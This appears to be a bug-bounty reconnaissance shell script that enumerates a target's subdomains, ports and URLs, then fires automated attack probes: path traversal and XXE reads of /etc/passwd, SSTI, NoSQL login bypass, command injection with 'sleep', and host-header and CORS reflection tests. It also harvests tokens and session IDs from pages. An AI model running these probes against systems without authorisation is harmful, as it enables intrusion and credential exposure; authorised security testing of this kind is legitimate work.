#!/bin/bash
# Bug Hunter - Full Recon Pipeline
# Usage: ./recon.sh <target.tld>

set -e

# Auto-load config if present
CONFIG_DIR="$(cd "$(dirname "$0")" && pwd)"
[ -f "$CONFIG_DIR/recon.cfg" ] && source "$CONFIG_DIR/recon.cfg"
[ -f ~/.config/bug-hunter/recon.cfg ] && source ~/.config/bug-hunter/recon.cfg

TARGET=$1
OUTPUT_DIR="/tmp/bug-hunter-$TARGET"
TOTAL_PHASES=9
NUCLEI_TEMPLATES="/home/Dark-Knight/nuclei-templates"
WHATWEB="/tmp/whatweb/whatweb"
TIMING="\033[2m"  NL="\033[0m"

# Colors
R="\033[31m" G="\033[32m" Y="\033[33m" B="\033[34m" C="\033[36m"
W="\033[1;37m" D="\033[2m" O="\033[0m"

phase_header() {
  local num=$1 title=$2
  echo -e "  ${C}┃${O}  ${W}Phase ${num}/${TOTAL_PHASES}${O}  ${D}▸${O}  ${W}${title}${O}"
}

summary_item() {
  local label=$1 value=$2
  printf "  ${C}┃${O}  ${D}%-20s${O} ${W}%s${O}\n" "$label" "$value"
}

mkdir -p "$OUTPUT_DIR"
echo ""
echo -e "  ${C}╔════════════════════════════════════════════╗${O}"
echo -e "  ${C}║${O}  ${W}Bug Hunter Recon${O}                              ${C}║${O}"
echo -e "  ${C}║${O}  ${D}Target:${O} ${W}$TARGET${O}                      ${C}║${O}"
echo -e "  ${C}╚════════════════════════════════════════════╝${O}"
echo ""

# ==================================================================
# PHASE 1: Subdomain Enumeration
# ==================================================================
phase_header 1 "Subdomain Enumeration"
echo ""

echo "    ${Y}▸${O} subfinder (all sources)..."
subfinder -d "$TARGET" -all -silent -o "$OUTPUT_DIR/subs_subfinder.txt" 2>/dev/null || true

echo "    ${Y}▸${O} amass (passive)..."
amass enum -passive -d "$TARGET" -silent -o "$OUTPUT_DIR/subs_amass.txt" 2>/dev/null || true

echo "    ${Y}▸${O} crt.sh..."
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' 2>/dev/null | sort -u > "$OUTPUT_DIR/subs_crt.txt" || true

echo "    ${Y}▸${O} chaos..."
chaos -d "$TARGET" -silent -o "$OUTPUT_DIR/subs_chaos.txt" 2>/dev/null || true

echo "    ${Y}▸${O} sublist3r..."
sublist3r -d "$TARGET" -o "$OUTPUT_DIR/subs_sublist3r.txt" 2>/dev/null || true

echo "    ${Y}▸${O} findomain..."
findomain -t "$TARGET" -u "$OUTPUT_DIR/subs_findomain.txt" 2>/dev/null || true

echo "    ${Y}▸${O} amassfinder..."
amassfinder "$TARGET" 2>/dev/null > "$OUTPUT_DIR/subs_amassfinder.txt" || true

echo "    ${Y}▸${O} BufferOver.run..."
curl -s "https://dns.bufferover.run/dns?q=.$TARGET" 2>/dev/null | jq -r '.FDNS_A[]' 2>/dev/null | cut -d',' -f2 | sort -u > "$OUTPUT_DIR/subs_bufferover.txt" || true

echo "    ${Y}▸${O} Riddler.io..."
curl -s "https://riddler.io/search/exportcsv?q=pld:$TARGET" 2>/dev/null | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u > "$OUTPUT_DIR/subs_riddler.txt" || true

echo "    ${Y}▸${O} CertSpotter..."
curl -s "https://api.certspotter.com/v1/issuances?domain=$TARGET&include_subdomains=true&expand=dns_names" 2>/dev/null | jq '.[].dns_names' 2>/dev/null | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u > "$OUTPUT_DIR/subs_certspotter.txt" || true

echo "    ${Y}▸${O} Archive.org (CDX)..."
curl -s "http://web.archive.org/cdx/search/cdx?url=*.$TARGET/*&output=text&fl=original&collapse=urlkey" 2>/dev/null | sed -e 's_https*://__' -e "s/\/.*//" | sort -u > "$OUTPUT_DIR/subs_cdx.txt" || true

echo "    ${Y}▸${O} JLDC / Anubis..."
curl -s "https://jldc.me/anubis/subdomains/$TARGET" 2>/dev/null | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u > "$OUTPUT_DIR/subs_jldc.txt" || true

echo "    ${Y}▸${O} ThreatMiner..."
curl -s "https://api.threatminer.org/v2/domain.php?q=$TARGET&rt=5" 2>/dev/null | jq -r '.results[]' 2>/dev/null | grep -o "\w.*$TARGET" | sort -u > "$OUTPUT_DIR/subs_threatminer.txt" || true

echo "    ${Y}▸${O} ThreatCrowd..."
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$TARGET" 2>/dev/null | jq -r '.subdomains' 2>/dev/null | grep -o "\w.*$TARGET" | sort -u > "$OUTPUT_DIR/subs_threatcrowd.txt" || true

echo "    ${Y}▸${O} HackerTarget..."
curl -s "https://api.hackertarget.com/hostsearch/?q=$TARGET" 2>/dev/null | sort -u > "$OUTPUT_DIR/subs_hackertarget.txt" || true

echo "    ${Y}▸${O} AlienVault OTX..."
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$TARGET/url_list?limit=100&page=1" 2>/dev/null | grep -o '"hostname": *"[^"]*' | sed 's/"hostname": "//' | sort -u > "$OUTPUT_DIR/subs_alienvault.txt" || true

echo "    ${Y}▸${O} Censys..."
censys subdomains "$TARGET" 2>/dev/null > "$OUTPUT_DIR/subs_censys.txt" || true

echo "    ${Y}▸${O} Subdomain Center..."
curl -s "https://api.subdomain.center/?domain=$TARGET" 2>/dev/null | jq -r '.[]' 2>/dev/null | sort -u > "$OUTPUT_DIR/subs_subdomaincenter.txt" || true

echo "    ${Y}▸${O} RedHunt Labs Recon API..."
[ -n "$REDHUNT_API_KEY" ] && curl -s --request GET --url "https://reconapi.redhuntlabs.com/community/v1/domains/subdomains?domain=$TARGET&page_size=1000" --header "X-BLOBR-KEY: $REDHUNT_API_KEY" 2>/dev/null | jq -r '.subdomains[]' 2>/dev/null | sort -u > "$OUTPUT_DIR/subs_redhunt.txt" || true

echo "    ${Y}▸${O} nmap crt.sh script..."
nmap --script hostmap-crtsh.nse "$TARGET" 2>/dev/null | grep -oE "\w+\.$TARGET" | sort -u > "$OUTPUT_DIR/subs_nmap.txt" || true

cat "$OUTPUT_DIR"/subs_*.txt 2>/dev/null | sort -u > "$OUTPUT_DIR/subs.uniq"
total_subs=$(wc -l < "$OUTPUT_DIR/subs.uniq" 2>/dev/null || echo 0)
echo ""
echo -e "  ${C}┃${O}  ${G}✓${O} Found ${W}$total_subs${O} unique subdomains"
echo -e "  ${C}┃${O}  ${D}──────────────────────────────────────────${O}"

# ==================================================================
# PHASE 2: IP Resolution + DNS Deep Dive + Subdomain Takeover
# ==================================================================
phase_header 2 "IP Resolution, DNS Recon & Subdomain Takeover"
echo ""

echo "    ${Y}▸${O} Resolving A records..."
dnsx -l "$OUTPUT_DIR/subs.uniq" -silent -a -resp -o "$OUTPUT_DIR/dns_a.txt" 2>/dev/null || true
awk '{print $NF}' "$OUTPUT_DIR/dns_a.txt" 2>/dev/null | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | sort -u > "$OUTPUT_DIR/ips.txt"

echo "    ${Y}▸${O} Querying CNAME, MX, TXT, NS, SOA records..."
dnsx -l "$OUTPUT_DIR/subs.uniq" -silent -cname -mx -txt -ns -soa -resp -o "$OUTPUT_DIR/dns_records.txt" 2>/dev/null || true

# Extract CNAMEs for takeover assessment
awk '/\[cname/ {print $NF}' "$OUTPUT_DIR/dns_records.txt" 2>/dev/null | sort -u > "$OUTPUT_DIR/cnames.txt" || true

echo "    ${Y}▸${O} Checking for subdomain takeover (nuclei)..."
nuclei -l "$OUTPUT_DIR/subs.uniq" -t "$NUCLEI_TEMPLATES/http/takeovers/" -silent -jsonl -o "$OUTPUT_DIR/takeover_results.json" 2>/dev/null || true
takeover_count=$(jq -c '.' "$OUTPUT_DIR/takeover_results.json" 2>/dev/null | wc -l || echo 0)

total_ips=$(wc -l < "$OUTPUT_DIR/ips.txt" 2>/dev/null || echo 0)
echo ""
echo -e "  ${C}┃${O}  ${G}✓${O} ${W}$total_ips${O} unique IPs resolved"
echo -e "  ${C}┃${O}  ${G}✓${O} DNS records saved to ${D}dns_a.txt${O}, ${D}dns_records.txt${O}"
echo -e "  ${C}┃${O}  ${G}✓${O} Takeover checks: ${W}$takeover_count${O} potential findings"
echo -e "  ${C}┃${O}  ${D}──────────────────────────────────────────${O}"

# ==================================================================
# PHASE 3: Live Web Probing
# ==================================================================
phase_header 3 "Live Web Probing"
echo ""

echo "    ${Y}▸${O} httpx probe (status, title, tech, IP, CNAME)..."
httpx -l "$OUTPUT_DIR/subs.uniq" -silent -status-code -title -tech-detect -ip -cname -cdn -json -o "$OUTPUT_DIR/probe.json" 2>/dev/null || true

jq -r 'select(.status_code != null) | .host' "$OUTPUT_DIR/probe.json" 2>/dev/null | sort -u > "$OUTPUT_DIR/alive.txt" || true
alive_count=$(wc -l < "$OUTPUT_DIR/alive.txt" 2>/dev/null || echo 0)

echo "    ${Y}▸${O} Separating by status code..."
for code in 200 201 204 301 302 303 307 308 400 401 403 404 405 410 429 500 502 503; do
  jq -r "select(.status_code == $code) | .host" "$OUTPUT_DIR/probe.json" 2>/dev/null | sort -u > "$OUTPUT_DIR/alive${code}.txt" || true
  c=$(wc -l < "$OUTPUT_DIR/alive${code}.txt" 2>/dev/null || echo 0)
  [ "$c" -gt 0 ] && printf "  ${C}┃${O}  ${D}  %-8s${O} ${W}%s${O}\n" "$code:" "$c"
done

echo ""
echo -e "  ${C}┃${O}  ${G}✓${O} ${W}$alive_count${O} live hosts detected"
echo -e "  ${C}┃${O}  ${D}──────────────────────────────────────────${O}"

# ==================================================================
# PHASE 4: Technology Fingerprinting
# ==================================================================
phase_header 4 "Technology Fingerprinting"
echo ""

echo "    ${Y}▸${O} Extracting tech from httpx probe..."
jq -r '.tech[]' "$OUTPUT_DIR/probe.json" 2>/dev/null | sort | uniq -c | sort -rn > "$OUTPUT_DIR/tech_stack.txt" || true
echo -e "  ${C}┃${O}  ${D}Top technologies from httpx:${O}"
awk '{printf "  %s├─ %s (%s)\n", "    ", $2, $1}' "$OUTPUT_DIR/tech_stack.txt" 2>/dev/null | head -12

echo ""
echo "    ${Y}▸${O} Deep tech detection (nuclei technologies)..."
nuclei -l "$OUTPUT_DIR/alive.txt" -t "$NUCLEI_TEMPLATES/http/technologies/" -silent -jsonl -o "$OUTPUT_DIR/tech_nuclei.json" 2>/dev/null || true
tech_nuclei_count=$(jq -c '.' "$OUTPUT_DIR/tech_nuclei.json" 2>/dev/null | wc -l || echo 0)

echo "    ${Y}▸${O} WAF fingerprinting (nuclei)..."
nuclei -l "$OUTPUT_DIR/alive.txt" -t "$NUCLEI_TEMPLATES/http/technologies/waf-detect.yaml" -silent -o "$OUTPUT_DIR/waf_detect.txt" 2>/dev/null || true
waf_count=$(wc -l < "$OUTPUT_DIR/waf_detect.txt" 2>/dev/null || echo 0)

echo ""
echo -e "  ${C}┃${O}  ${G}✓${O} ${W}$tech_nuclei_count${O} tech detections, ${W}$waf_count${O} WAFs identified"
echo -e "  ${C}┃${O}  ${D}──────────────────────────────────────────${O}"

# ==================================================================
# PHASE 5: Full Port Scanning
# ==================================================================
phase_header 5 "Full Port Scanning"
echo ""

echo "    ${Y}▸${O} naabu port scan (top 1000 ports)..."
naabu -list "$OUTPUT_DIR/ips.txt" -top-ports 1000 -silent -json -o "$OUTPUT_DIR/ports.json" 2>/dev/null || true

jq -r '. | "\(.ip):\(.port)"' "$OUTPUT_DIR/ports.json" 2>/dev/null | sort -u > "$OUTPUT_DIR/open_ports.txt" || true

# Also extract unique ports for a summary
total_open_ports=$(wc -l < "$OUTPUT_DIR/open_ports.txt" 2>/dev/null || echo 0)
echo ""
echo -e "  ${C}┃${O}  ${G}✓${O} ${W}$total_open_ports${O} open ports discovered"
echo -e "  ${C}┃${O}  ${D}──────────────────────────────────────────${O}"

# ==================================================================
# PHASE 6: Historical URL Discovery + Endpoint Watchers
# ==================================================================
phase_header 6 "Historical URL Discovery & Endpoint Watchers"
echo ""

echo "    ${Y}▸${O} katana crawl on alive hosts..."
katana -list "$OUTPUT_DIR/alive.txt" -d 2 -silent -o "$OUTPUT_DIR/endpoints_katana.txt" 2>/dev/null || true

echo "    ${Y}▸${O} hakrawler on alive hosts..."
cat "$OUTPUT_DIR/alive.txt" | hakrawler -silent 2>/dev/null | sort -u > "$OUTPUT_DIR/endpoints_hakrawler.txt" || true

echo "    ${Y}▸${O} waybackurls on alive hosts..."
cat "$OUTPUT_DIR/alive.txt" | waybackurls 2>/dev/null | sort -u > "$OUTPUT_DIR/endpoints_wayback.txt" || true

echo "    ${Y}▸${O} gau on alive hosts..."
cat "$OUTPUT_DIR/alive.txt" | gau --threads 10 2>/dev/null | sort -u > "$OUTPUT_DIR/endpoints_gau.txt" || true

echo "    ${Y}▸${O} gospider crawl..."
gospider -S "$OUTPUT_DIR/alive.txt" --js -d 1 --sitemap --robots -o "$OUTPUT_DIR/gospider_out" 2>/dev/null || true
find "$OUTPUT_DIR/gospider_out" -name '*.txt' -exec cat {} + 2>/dev/null | sort -u > "$OUTPUT_DIR/endpoints_gospider.txt" || true

echo "    ${Y}▸${O} paramspider..."
paramspider -l "$OUTPUT_DIR/alive.txt" -o "$OUTPUT_DIR/endpoints_paramspider.txt" 2>/dev/null || true

echo "    ${Y}▸${O} archive.org CDX API (main domain only)..."
curl -sG "https://web.archive.org/cdx/search/cdx" --data-urlencode "url=*.$TARGET/*" --data-urlencode "collapse=urlkey" --data-urlencode "output=text" --data-urlencode "fl=original" 2>/dev/null > "$OUTPUT_DIR/endpoints_cdx.txt" || true

echo "    ${Y}▸${O} Merging all endpoints..."
cat "$OUTPUT_DIR"/endpoints_*.txt 2>/dev/null | sort -u > "$OUTPUT_DIR/allendpoints.txt"
total_endpoints=$(wc -l < "$OUTPUT_DIR/allendpoints.txt" 2>/dev/null || echo 0)

echo "    ${Y}▸${O} Filtering juicy endpoints..."
cat "$OUTPUT_DIR/allendpoints.txt" 2>/dev/null | grep -E '\.(json|xml|env|bak|swp|sql|zip|tar|gz|7z|log|pem|key|js)(\?|$)' | sort -u > "$OUTPUT_DIR/juicy.urls" || true
juicy_count=$(wc -l < "$OUTPUT_DIR/juicy.urls" 2>/dev/null || echo 0)

echo "    ${Y}▸${O} Scanning for open redirect..."
nuclei -l "$OUTPUT_DIR/alive.txt" -t "$NUCLEI_TEMPLATES/http/vulnerabilities/generic/open-redirect.yaml" -silent -jsonl -o "$OUTPUT_DIR/open_redirect.json" 2>/dev/null || true

echo "    ${Y}▸${O} Scanning for XSS entry points..."
# Build full URLs from alive hosts with paths from endpoints
cat "$OUTPUT_DIR/allendpoints.txt" 2>/dev/null | grep "=" | gf xss 2>/dev/null | sort -u > "$OUTPUT_DIR/xss_candidates.txt" || true
xss_count=$(wc -l < "$OUTPUT_DIR/xss_candidates.txt" 2>/dev/null || echo 0)

echo ""
echo -e "  ${C}┃${O}  ${G}✓${O} ${W}$total_endpoints${O} URLs discovered"
echo -e "  ${C}┃${O}  ${G}✓${O} ${W}$juicy_count${O} juicy endpoints flagged"
echo -e "  ${C}┃${O}  ${G}✓${O} ${W}$xss_count${O} XSS candidate parameters"
echo -e "  ${C}┃${O}  ${D}──────────────────────────────────────────${O}"

# ==================================================================
# PHASE 7: URL Parameter Extraction
# ==================================================================
phase_header 7 "URL Parameter Extraction"
echo ""

mkdir -p "$OUTPUT_DIR/params"

for pattern in xss ssrf lfi rce sqli ssti redirect idor; do
  gf "$pattern" "$OUTPUT_DIR/allendpoints.txt" 2>/dev/null | sort -u > "$OUTPUT_DIR/params/${pattern}.txt" || true
  count=$(wc -l < "$OUTPUT_DIR/params/${pattern}.txt" 2>/dev/null || echo 0)
  printf "  ${Y}▸${O} gf %-10s  ${D}→${O} ${W}%s${O} URLs\n" "$pattern" "$count"
done

echo ""
# Combined insight
total_param_urls=$(cat "$OUTPUT_DIR/params"/*.txt 2>/dev/null | sort -u | wc -l || echo 0)
echo -e "  ${C}┃${O}  ${G}✓${O} ${W}$total_param_urls${O} total parameterized URLs extracted (saved in ${D}params/${O})"
echo -e "  ${C}┃${O}  ${D}──────────────────────────────────────────${O}"

# ==================================================================
# PHASE 8: JavaScript Collection + Secret Scanning
# ==================================================================
phase_header 8 "JavaScript Collection & Secret Scanning"
echo ""

echo "    ${Y}▸${O} Crawling for JS files (katana)..."
katana -list "$OUTPUT_DIR/alive.txt" -d 3 -jc -kf all -aff -fs fqdn -o "$OUTPUT_DIR/crawled.txt" 2>/dev/null || true
grep -E '\.js(\?|$)' "$OUTPUT_DIR/crawled.txt" 2>/dev/null | sort -u > "$OUTPUT_DIR/js.urls" || true

# Also pull JS from historical endpoints
grep -E '\.js(\?|$)' "$OUTPUT_DIR/allendpoints.txt" 2>/dev/null | sort -u >> "$OUTPUT_DIR/js.urls" 2>/dev/null || true
sort -u -o "$OUTPUT_DIR/js.urls" "$OUTPUT_DIR/js.urls"
total_js=$(wc -l < "$OUTPUT_DIR/js.urls" 2>/dev/null || echo 0)

echo "    ${Y}▸${O} Scanning JS for secrets (nuclei)..."
nuclei -l "$OUTPUT_DIR/js.urls" -t "$NUCLEI_TEMPLATES/http/exposures/" -silent -jsonl -o "$OUTPUT_DIR/js_secrets.json" 2>/dev/null || true
secrets_found=$(jq -c '.' "$OUTPUT_DIR/js_secrets.json" 2>/dev/null | wc -l || echo 0)

echo "    ${Y}▸${O} gf pattern matching on JS (secrets, tokens)..."
gf secrets "$OUTPUT_DIR/js.urls" 2>/dev/null | sort -u > "$OUTPUT_DIR/js_gf_secrets.txt" || true
gf_count=$(wc -l < "$OUTPUT_DIR/js_gf_secrets.txt" 2>/dev/null || echo 0)

echo ""
echo -e "  ${C}┃${O}  ${G}✓${O} ${W}$total_js${O} JS files discovered"
echo -e "  ${C}┃${O}  ${G}✓${O} ${W}$secrets_found${O} potential secrets (nuclei), ${W}$gf_count${O} pattern matches (gf)"
echo -e "  ${C}┃${O}  ${D}──────────────────────────────────────────${O}"

# ==================================================================
# PHASE 9: Skills-Driven Bug Detection
# ==================================================================
phase_header 9 "Skills-Driven Bug Detection (skills1 reference)"
echo ""

BUGDIR="$OUTPUT_DIR/bugs"
mkdir -p "$BUGDIR"

print_check() { local skill=$1 file=$2 c=$3; printf "  ${C}┃${O}  ${D}  %-22s${O} ${W}%s${O} ${D}(%s)${O}\n" "$skill" "$c" "$file"; }
nuclei_run() { [ -s "$4" ] || return 0; nuclei -l "$4" -t "$NUCLEI_TEMPLATES/$1" -silent -jsonl -o "$BUGDIR/$2" 2>/dev/null || true; local c=$(jq -c '.' "$BUGDIR/$2" 2>/dev/null | wc -l || echo 0); print_check "$3" "$2" "$c"; }

printf "  ${D}  ═══════════════ Injection ═══════════════${O}\n"

grep "=" "$OUTPUT_DIR/allendpoints.txt" 2>/dev/null | sort -u | kxss 2>/dev/null | grep -v "Nothing found" > "$BUGDIR/xss_reflected.txt" || true
print_check "xss.md:kxss" "xss_reflected.txt" "$(wc -l <$BUGDIR/xss_reflected.txt 2>/dev/null || echo 0)"

grep "=" "$OUTPUT_DIR/allendpoints.txt" 2>/dev/null | head -2000 | qsreplace '{{7*7}}' 2>/dev/null | httpx -silent -mr "49" -o "$BUGDIR/ssti.txt" 2>/dev/null || true
print_check "ssti.md:qsreplace" "ssti.txt" "$(wc -l <$BUGDIR/ssti.txt 2>/dev/null || echo 0)"

grep "=" "$OUTPUT_DIR/allendpoints.txt" 2>/dev/null | head -2000 | qsreplace '../../../../etc/passwd' 2>/dev/null | httpx -silent -mr "root:" -o "$BUGDIR/lfi.txt" 2>/dev/null || true
print_check "file-reading.md" "lfi.txt" "$(wc -l <$BUGDIR/lfi.txt 2>/dev/null || echo 0)"

nuclei_run "http/vulnerabilities/" "sqli.json" "sqli.md" "$OUTPUT_DIR/params/sqli.txt"
nuclei_run "http/vulnerabilities/" "xss_nuclei.json" "xss.md" "$OUTPUT_DIR/alive.txt"

grep -E "(login|auth|signin)" "$OUTPUT_DIR/allendpoints.txt" 2>/dev/null | head -10 | while IFS= read -r u; do
  curl -sk --connect-timeout 5 -X POST "$u" -H "Content-Type: application/json" -d '{"username":"admin","password":{"$gt":""}}' 2>/dev/null | grep -qiE "token|session|welcome|dashboard" && echo "$u" >> "$BUGDIR/nosqli.txt"
done
print_check "nosql-injection.md" "nosqli.txt" "$(wc -l <$BUGDIR/nosqli.txt 2>/dev/null || echo 0)"

grep -E "(ping|traceroute|host|ip|server|domain)" "$OUTPUT_DIR/params/ssrf.txt" 2>/dev/null | head -50 | qsreplace '127.0.0.1;sleep 5' 2>/dev/null | while IFS= read -r u; do
  t=$(curl -sk --connect-timeout 10 -o /dev/null -w "%{time_total}" "$u" 2>/dev/null || echo 0)
  awk "BEGIN {if ($t >= 4.5) print \"$u\"}" >> "$BUGDIR/command_injection.txt" 2>/dev/null || true
done
print_check "command-injection.md" "command_injection.txt" "$(wc -l <$BUGDIR/command_injection.txt 2>/dev/null || echo 0)"

printf "\n  ${D}  ═══════════════ SSRF / Redirect ═══════════════${O}\n"

grep -E "(=https?://|=//)" "$OUTPUT_DIR/allendpoints.txt" 2>/dev/null | head -500 | httpx -silent -mc 301,302,303,307,308 -location -o "$BUGDIR/open_redirects.txt" 2>/dev/null || true
print_check "open-redirect.md" "open_redirects.txt" "$(wc -l <$BUGDIR/open_redirects.txt 2>/dev/null || echo 0)"

nuclei_run "http/vulnerabilities/generic/crlf-injection.yaml" "crlf.json" "crlf.md" "$OUTPUT_DIR/alive.txt"

head -30 "$OUTPUT_DIR/alive.txt" 2>/dev/null | while IFS= read -r host; do
  curl -sk --connect-timeout 5 -H "Host: attacker.test" "https://$host/" 2>/dev/null | grep -qi "attacker.test" && echo "$host" >> "$BUGDIR/host_header.txt"
done
print_check "host-header-injection.md" "host_header.txt" "$(wc -l <$BUGDIR/host_header.txt 2>/dev/null || echo 0)"

printf "\n  ${D}  ═══════════════ Config / Exposure ═══════════════${O}\n"

nuclei_run "http/exposures/configs/" "configs.json" "env-exposure.md" "$OUTPUT_DIR/alive.txt"
nuclei_run "http/exposures/configs/springboot-actuator.yaml" "actuator.json" "spring-boot-actuator.md" "$OUTPUT_DIR/alive.txt"
nuclei_run "http/exposed-panels/" "panels.json" "default-credentials.md" "$OUTPUT_DIR/alive.txt"
nuclei_run "http/default-logins/" "default_logins.json" "default-credentials.md" "$OUTPUT_DIR/alive.txt"
nuclei_run "http/exposures/apis/" "apis.json" "api.md" "$OUTPUT_DIR/alive.txt"
nuclei_run "http/exposures/backups/" "backups.json" "infodisclosure.md" "$OUTPUT_DIR/alive.txt"
nuclei_run "http/exposures/tokens/" "tokens.json" "jwt.md" "$OUTPUT_DIR/js.urls"

httpx -l "$OUTPUT_DIR/alive.txt" -path /phpinfo.php -silent -mc 200 -o "$BUGDIR/phpinfo.txt" 2>/dev/null || true
print_check "phpinfo.md" "phpinfo.txt" "$(wc -l <$BUGDIR/phpinfo.txt 2>/dev/null || echo 0)"

grep -oE "[a-zA-Z0-9._-]+\.s3[^ ]*amazonaws\.com" "$OUTPUT_DIR/cnames.txt" 2>/dev/null | sort -u > "$BUGDIR/s3_buckets.txt"
print_check "s3-bucket.md" "s3_buckets.txt" "$(wc -l <$BUGDIR/s3_buckets.txt 2>/dev/null || echo 0)"

printf "\n  ${D}  ═══════════════ Web / Front-end ═══════════════${O}\n"

nuclei_run "http/misconfiguration/cors" "cors.json" "cors.md" "$OUTPUT_DIR/alive.txt"
nuclei_run "http/misconfiguration/http-missing-security-headers.yaml" "sec_headers.json" "clickjacking.md+security" "$OUTPUT_DIR/alive.txt"

head -20 "$OUTPUT_DIR/alive.txt" 2>/dev/null | while IFS= read -r host; do
  curl -sk --connect-timeout 5 -H "Origin: https://evil.test" "https://$host/" 2>/dev/null | grep -qi "evil.test" && echo "$host" >> "$BUGDIR/cors_reflected.txt"
done
print_check "cors.md:reflection" "cors_reflected.txt" "$(wc -l <$BUGDIR/cors_reflected.txt 2>/dev/null || echo 0)"

jq -r 'select(.status_code == 200) | .host' "$OUTPUT_DIR/probe.json" 2>/dev/null | head -20 > "$BUGDIR/clickjacking.txt"
print_check "clickjacking.md" "clickjacking.txt" "$(wc -l <$BUGDIR/clickjacking.txt 2>/dev/null || echo 0)"

head -10 "$OUTPUT_DIR/alive.txt" 2>/dev/null | while IFS= read -r host; do
  curl -sk --connect-timeout 5 -D- "https://$host/test.css" 2>/dev/null | grep -qiE "x-cache: hit|age: [1-9]|cf-cache-status: hit" && echo "$host" >> "$BUGDIR/cache_deception.txt"
done
print_check "cache-deception.md" "cache_deception.txt" "$(wc -l <$BUGDIR/cache_deception.txt 2>/dev/null || echo 0)"

head -20 "$OUTPUT_DIR/alive.txt" 2>/dev/null | while IFS= read -r host; do
  curl -sk --connect-timeout 5 "https://$host/" 2>/dev/null | grep -qP 'target="_blank"(?!.*(?:noopener|noreferrer))' && echo "$host" >> "$BUGDIR/tabnabbing.txt" || true
done
print_check "tabnabbing.md" "tabnabbing.txt" "$(wc -l <$BUGDIR/tabnabbing.txt 2>/dev/null || echo 0)"

printf "\n  ${D}  ═══════════════ Auth / Session ═══════════════${O}\n"

head -20 "$OUTPUT_DIR/alive.txt" 2>/dev/null | while IFS= read -r host; do
  curl -sk --connect-timeout 5 -X POST "https://$host/graphql" -H "Content-Type: application/json" -d '{"query":"query{__schema{types{name}}}"}' 2>/dev/null | grep -q '"data"' && echo "$host" >> "$BUGDIR/graphql.txt"
done
print_check "graphql.md" "graphql.txt" "$(wc -l <$BUGDIR/graphql.txt 2>/dev/null || echo 0)"

head -10 "$OUTPUT_DIR/alive.txt" 2>/dev/null | while IFS= read -r host; do
  sid=$(curl -sk --connect-timeout 5 -D- "https://$host/" 2>/dev/null | grep -oiE "PHPSESSID=[^;]+|JSESSIONID=[^;]+|connect.sid=[^;]+" | head -1)
  [ -n "$sid" ] && curl -sk --connect-timeout 5 -D- -b "$sid" -d "username=test&password=test" "https://$host/login" 2>/dev/null | grep -qi "$sid" && echo "$host" >> "$BUGDIR/session_fixation.txt"
done < <(head -10 "$OUTPUT_DIR/alive.txt" 2>/dev/null)
printf "  ${C}┃${O}  ${D}  %-20s${O} ${W}%s${O} ${D}(%s)${O}\n" "session-fixation.md:" "$(wc -l < $BUGDIR/session_fixation.txt 2>/dev/null || echo 0)" "session_fixation.txt"

# XXE
grep -E "\.xml|/api|/soap|/ws" "$OUTPUT_DIR/allendpoints.txt" 2>/dev/null | head -10 | while IFS= read -r u; do
  curl -sk --connect-timeout 5 -X POST "$u" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' 2>/dev/null | grep -qi "root:\|www-data\|nobody" && echo "$u" >> "$BUGDIR/xxe.txt"
done
printf "  ${C}┃${O}  ${D}  %-20s${O} ${W}%s${O} ${D}(%s)${O}\n" "xxe.md:" "$(wc -l < $BUGDIR/xxe.txt 2>/dev/null || echo 0)" "xxe.txt"

printf "\n  ${D}  ═══════════════ Secrets / Leaks ═══════════════${O}\n"

# JWT tokens from JS
head -50 "$OUTPUT_DIR/js.urls" 2>/dev/null | while IFS= read -r u; do
  curl -sk --connect-timeout 5 "$u" 2>/dev/null | grep -oE "eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}" >> "$BUGDIR/jwt_tokens.txt" || true
done
sort -u -o "$BUGDIR/jwt_tokens.txt" "$BUGDIR/jwt_tokens.txt" 2>/dev/null
printf "  ${C}┃${O}  ${D}  %-20s${O} ${W}%s${O} ${D}(%s)${O}\n" "jwt.md:" "$(wc -l < $BUGDIR/jwt_tokens.txt 2>/dev/null || echo 0)" "jwt_tokens.txt"

# WebSocket from JS
grep -oE 'wss?://[^"'"'"' ]+' "$OUTPUT_DIR/js.urls" 2>/dev/null | sort -u > "$BUGDIR/websocket_urls.txt"
printf "  ${C}┃${O}  ${D}  %-20s${O} ${W}%s${O} ${D}(%s)${O}\n" "websocket.md:" "$(wc -l < $BUGDIR/websocket_urls.txt 2>/dev/null || echo 0)" "websocket_urls.txt"

# WebSocket endpoint discovery
while IFS= read -r host; do
  curl -sk --connect-timeout 5 -I "https://$host/ws" -H "Upgrade: websocket" -H "Connection: Upgrade" 2>/dev/null | grep -qi "101 Switching" && echo "$host" >> "$BUGDIR/websocket_endpoints.txt"
done < <(head -20 "$OUTPUT_DIR/alive.txt" 2>/dev/null)
printf "  ${C}┃${O}  ${D}  %-20s${O} ${W}%s${O} ${D}(%s)${O}\n" "websocket.md:" "$(wc -l < $BUGDIR/websocket_endpoints.txt 2>/dev/null || echo 0)" "websocket_endpoints.txt"

# Rate limit / DoS check
while IFS= read -r host; do
  curl -sk --connect-timeout 5 -I "https://$host/" 2>/dev/null | grep -qiE "x-ratelimit|ratelimit|retry-after|429" || echo "$host" >> "$BUGDIR/rate_limit.txt"
done < <(head -5 "$OUTPUT_DIR/alive.txt" 2>/dev/null)
printf "  ${C}┃${O}  ${D}  %-20s${O} ${W}%s${O} ${D}(%s)${O}\n" "dos.md:" "$(wc -l < $BUGDIR/rate_limit.txt 2>/dev/null || echo 0)" "rate_limit.txt"

# Info-disclosure headers
curl -sk --connect-timeout 5 -D- "https://$(head -1 "$OUTPUT_DIR/alive.txt" 2>/dev/null)" 2>/dev/null | grep -iE "^(server|x-powered-by|x-aspnet|x-runtime|via)" | sort -u > "$BUGDIR/header_leaks.txt" || true
printf "  ${C}┃${O}  ${D}  %-20s${O} ${W}%s${O} ${D}(%s)${O}\n" "infodisclosure.md:" "$(wc -l < $BUGDIR/header_leaks.txt 2>/dev/null || echo 0)" "header_leaks.txt"

total_bugs=0
